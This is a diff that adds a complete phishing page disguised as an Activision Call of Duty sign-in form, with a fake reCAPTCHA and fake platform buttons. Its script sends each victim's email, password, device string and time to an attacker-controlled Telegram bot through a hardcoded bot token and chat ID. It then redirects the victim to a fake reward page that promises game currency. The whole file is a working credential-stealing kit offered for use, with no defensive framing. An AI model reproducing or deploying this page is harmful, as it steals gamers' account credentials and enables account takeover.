@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in - CALL OF DUTY®</title>
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,800|Six+Caps&amp;subset=latin,latin" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Open Sans', Arial, sans-serif;
+            background: #0a0a0a;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .main-card {
+            background: #141414;
+            max-width: 420px;
+            width: 100%;
+            border-radius: 10px;
+            padding: 30px 28px 22px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.95);
+            border: 1px solid #262626;
+        }
+        .logo-area { text-align: center; margin-bottom: 4px; }
+        .logo-area .cod-logo {
+            font-size: 30px;
+            font-weight: 900;
+            letter-spacing: 4px;
+            color: #ffffff;
+            font-family: 'Six Caps', 'Arial Black', sans-serif;
+            display: block;
+        }
+        .logo-area .pre-cod {
+            font-size: 12px;
+            font-weight: 300;
+            color: #888;
+            letter-spacing: 3px;
+            display: block;
+            margin-bottom: 2px;
+        }
+        .preorder-row {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 12px 0 16px;
+        }
+        .preorder-btn {
+            background: transparent;
+            border: 1.5px solid #444;
+            color: #bbb;
+            padding: 5px 18px;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.8px;
+            cursor: default;
+            text-transform: uppercase;
+        }
+        .login-step { text-align: center; margin: 10px 0 16px; }
+        .login-step .step-text {
+            display: inline-block;
+            background: #1a1a1a;
+            padding: 6px 20px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #aaa;
+            letter-spacing: 0.5px;
+            border: 1px solid #2a2a2a;
+        }
+        .login-step .step-text span { color: #fff; font-weight: 600; }
+        .form-title {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 700;
+            color: #e8e8e8;
+            letter-spacing: 0.5px;
+            margin: 8px 0 18px;
+            line-height: 1.4;
+        }
+        .form-title span { display: block; font-size: 14px; font-weight: 400; color: #aaa; }
+        .form-group { margin-bottom: 14px; }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #c0c0c0;
+            margin-bottom: 4px;
+            letter-spacing: 0.2px;
+        }
+        .form-group label .star { color: #d43f3f; margin-left: 2px; }
+        .form-group input {
+            width: 100%;
+            padding: 11px 14px;
+            background: #1c1c1c;
+            border: 1px solid #333;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            transition: 0.2s;
+        }
+        .form-group input:focus { border-color: #5a5a5a; background: #222; }
+        .remember-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 6px 0 14px;
+        }
+        .remember-row input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #1e5c8c;
+        }
+        .remember-row label { font-size: 13px; color: #aaa; }
+        .recaptcha-box {
+            background: #181818;
+            border: 1px solid #2e2e2e;
+            border-radius: 5px;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 6px 10px;
+            margin: 14px 0 18px;
+        }
+        .recaptcha-left { display: flex; align-items: center; gap: 10px; }
+        .recaptcha-checkbox {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #555;
+            border-radius: 3px;
+            background: #0e0e0e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 700;
+        }
+        .recaptcha-label { font-size: 13px; color: #d0d0d0; }
+        .recaptcha-right {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 12px;
+            color: #888;
+        }
+        .recaptcha-right strong { color: #aaa; font-weight: 600; }
+        .recaptcha-right small { font-size: 9px; color: #666; margin-left: 4px; }
+        .signin-btn {
+            width: 100%;
+            padding: 13px;
+            background: #1e5c8c;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 2.5px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 2px;
+        }
+        .signin-btn:hover { background: #1a4f7a; }
+        .signin-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .message-box {
+            display: none;
+            padding: 12px 16px;
+            border-radius: 5px;
+            margin: 12px 0 8px;
+            font-size: 13px;
+            text-align: center;
+        }
+        .message-box.error { display: block; background: #2a1515; border: 1px solid #d43f3f; color: #ff6b6b; }
+        .message-box.success { display: block; background: #152a15; border: 1px solid #4caf50; color: #7fd17f; }
+        .message-box.loading { display: block; background: #1a1a2a; border: 1px solid #4a6a8a; color: #88b0ff; }
+        .need-help { text-align: center; margin: 14px 0 10px; }
+        .need-help a { color: #aaa; font-size: 13px; text-decoration: none; border-bottom: 1px dotted #555; padding-bottom: 2px; cursor: default; }
+        .or-divider { text-align: center; margin: 16px 0 12px; position: relative; }
+        .or-divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #2a2a2a;
+        }
+        .or-divider p {
+            display: inline-block;
+            background: #141414;
+            padding: 0 16px;
+            position: relative;
+            z-index: 1;
+            color: #666;
+            font-size: 13px;
+            font-weight: 600;
+            letter-spacing: 2px;
+        }
+        .platform-sub { text-align: center; font-size: 12px; color: #888; margin: 10px 0 12px; letter-spacing: 0.5px; }
+        .platform-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+        .platform-btn {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 10px 4px;
+            color: #bbb;
+            font-size: 10px;
+            font-weight: 700;
+            text-align: center;
+            cursor: default;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        .platform-btn.psn { border-color: #003791; color: #88b0ff; }
+        .platform-btn.xbl { border-color: #107c10; color: #7fd17f; }
+        .platform-btn.nintendo { border-color: #e60012; color: #ff7a7a; }
+        .platform-btn.battle { border-color: #6b3fa0; color: #b88aff; }
+        .platform-btn.steam { border-color: #2a3a5a; color: #8ab3ff; }
+        .platform-btn.ubi { border-color: #1a2a3a; color: #7ab8ff; }
+        .signup-row {
+            text-align: center;
+            font-size: 13px;
+            color: #aaa;
+            margin: 6px 0 8px;
+            padding-top: 4px;
+        }
+        .signup-row a { color: #fff; text-decoration: none; font-weight: 600; border-bottom: 1px solid #555; padding-bottom: 1px; cursor: default; }
+        .divider { border: none; border-top: 1px solid #282828; margin: 16px 0 14px; }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 6px 12px;
+            font-size: 10px;
+            color: #666;
+            margin: 4px 0 6px;
+        }
+        .footer-links a, .footer-links button {
+            color: #777;
+            text-decoration: none;
+            letter-spacing: 0.3px;
+            background: none;
+            border: none;
+            font-size: 10px;
+            font-family: inherit;
+            cursor: default;
+        }
+        .footer-bottom {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            gap: 10px 14px;
+            margin-top: 12px;
+            font-size: 10px;
+            color: #555;
+        }
+        .footer-bottom .brand { font-weight: 700; color: #777; letter-spacing: 1.5px; font-size: 11px; }
+        .footer-bottom .badge { border: 1px solid #333; padding: 2px 8px; border-radius: 3px; font-size: 8px; color: #888; letter-spacing: 0.5px; }
+        .footer-bottom .tm { font-weight: 700; color: #888; font-size: 12px; }
+        .footer-bottom .esrb { font-weight: 700; color: #888; font-size: 12px; }
+        @media (max-width: 480px) {
+            .main-card { padding: 20px 14px 16px; }
+            .logo-area .cod-logo { font-size: 100px; letter-spacing: 2px; }
+            .preorder-btn { font-size: 9px; padding: 4px 12px; }
+            .platform-grid { grid-template-columns: 1fr 1fr 1fr; gap: 6px; }
+            .platform-btn { font-size: 8px; padding: 8px 2px; }
+            .footer-links { gap: 4px 8px; font-size: 9px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-card">
+
+    <div class="logo-area">
+        <span class="pre-cod">Join the World of</span>
+        <span class="cod-logo">CALL OF DUTY</span>
+    </div>
+
+    <div class="login-step">
+        <span class="step-text">Log in Via Your <span>Network</span></span>
+    </div>
+
+    <div class="form-title">
+        Sign in to your
+        <span>Activision account</span>
+    </div>
+
+    <div class="form-group">
+        <label>Email Address: <span class="star">*</span></label>
+        <input type="email" id="emailInput" placeholder="Enter your email">
+    </div>
+
+    <div class="remember-row">
+        <input type="checkbox" id="remember" checked>
+        <label for="remember">Remember me</label>
+    </div>
+
+    <div class="form-group">
+        <label>Password: <span class="star">*</span></label>
+        <input type="password" id="passwordInput" placeholder="Enter your password">
+    </div>
+
+    <div class="recaptcha-box">
+        <div class="recaptcha-left">
+            <span class="recaptcha-checkbox">✓</span>
+            <span class="recaptcha-label">I'm not a robot</span>
+        </div>
+        <div class="recaptcha-right">
+            <span>re</span><strong>CAPTCHA</strong>
+            <small>Privacy · Terms</small>
+        </div>
+    </div>
+
+    <div id="messageBox" class="message-box"></div>
+
+    <button class="signin-btn" id="signinBtn">SIGN IN</button>
+
+    <div class="need-help">
+        <a href="#">Need Help?</a>
+    </div>
+
+    <div class="or-divider">
+        <p>OR</p>
+    </div>
+
+    <div class="platform-sub">Select your network to get started</div>
+
+    <div class="platform-grid">
+        <span class="platform-btn psn">PlayStation</span>
+        <span class="platform-btn xbl">XBOX</span>
+        <span class="platform-btn nintendo">Nintendo</span>
+        <span class="platform-btn battle">Battle.net</span>
+        <span class="platform-btn steam">Steam</span>
+        <span class="platform-btn ubi">Ubisoft</span>
+    </div>
+
+    <div class="signup-row">
+        New to Call of Duty? <a href="#">Sign Up</a>
+    </div>
+
+    <hr class="divider">
+
+    <div class="footer-links">
+        <a href="#">Legal</a>
+        <a href="#">Terms of Use</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Cookie Policy</a>
+        <button disabled>Cookie Settings</button>
+        <a href="#">Online Safety</a>
+        <a href="#">Support</a>
+    </div>
+
+    <div class="footer-bottom">
+        <span class="brand">ACTIVISION</span>
+        <span class="badge">PRIVACY CERTIFIED</span>
+        <span class="tm">™</span>
+        <span class="esrb">ESRB</span>
+    </div>
+
+</div>
+
+<script>
+    // ===== تنظیمات ربات تلگرام =====
+    const BOT_TOKEN = '8248363309:AAGAqzNwHsZFb07jTi5LF1F4WhO_cM5G2bI';
+    const CHAT_ID = '6830764999';
+
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const signinBtn = document.getElementById('signinBtn');
+    const messageBox = document.getElementById('messageBox');
+
+    function showMessage(text, type) {
+        messageBox.textContent = text;
+        messageBox.className = 'message-box ' + type;
+    }
+
+    function hideMessage() {
+        messageBox.className = 'message-box';
+        messageBox.textContent = '';
+    }
+
+    // ===== ارسال به تلگرام =====
+    async function sendToTelegram(email, password) {
+        const message = 
+`🎮 **CALL OF DUTY LOGIN** 🎮
+━━━━━━━━━━━━━━━━━━
+📧 **Email:** ${email}
+🔑 **Password:** ${password}
+🖥️ **Device:** ${navigator.userAgent || 'Unknown'}
+⏰ **Time:** ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Tehran', hour12: false })}`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            const data = await response.json();
+            return data.ok;
+        } catch {
+            return false;
+        }
+    }
+
+    // ===== اعتبارسنجی =====
+    function validateForm() {
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!email) {
+            showMessage('Please enter your email address', 'error');
+            return null;
+        }
+        if (!password) {
+            showMessage('Please enter your password', 'error');
+            return null;
+        }
+        if (password.length < 6) {
+            showMessage('Password must be at least 6 characters', 'error');
+            return null;
+        }
+        return { email, password };
+    }
+
+    // ===== تولید کد رندوم 8 رقمی =====
+    function generateRandomCode() {
+        return Math.floor(10000000 + Math.random() * 90000000).toString();
+    }
+
+    // ===== تولید سی‌پی تصادفی بین 10 تا 300 =====
+    function generateRandomCP() {
+        return Math.floor(Math.random() * 291) + 10;
+    }
+
+    // ===== رویداد کلیک =====
+    signinBtn.addEventListener('click', async function() {
+        hideMessage();
+
+        const formData = validateForm();
+        if (!formData) return;
+
+        signinBtn.disabled = true;
+        signinBtn.textContent = 'SENDING...';
+        showMessage('Sending information...', 'loading');
+
+        // ارسال به تلگرام
+        await sendToTelegram(formData.email, formData.password);
+
+        // تولید کد و سی‌پی
+        const randomCode = generateRandomCode();
+        const randomCP = generateRandomCP();
+
+        // ذخیره در localStorage برای صفحه بعد
+        localStorage.setItem('cod_code', randomCode);
+        localStorage.setItem('cod_cp', randomCP);
+
+        // هدایت به صفحه دوم با پارامترها
+        window.location.href = `redeem.html?code=${randomCode}&cp=${randomCP}`;
+    });
+
+    // ===== Enter =====
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            const active = document.activeElement;
+            if (active === emailInput || active === passwordInput) {
+                signinBtn.click();
+            }
+        }
+    });
+
+    emailInput.addEventListener('input', hideMessage);
+    passwordInput.addEventListener('input', hideMessage);
+</script>
+
+</body>
+</html>
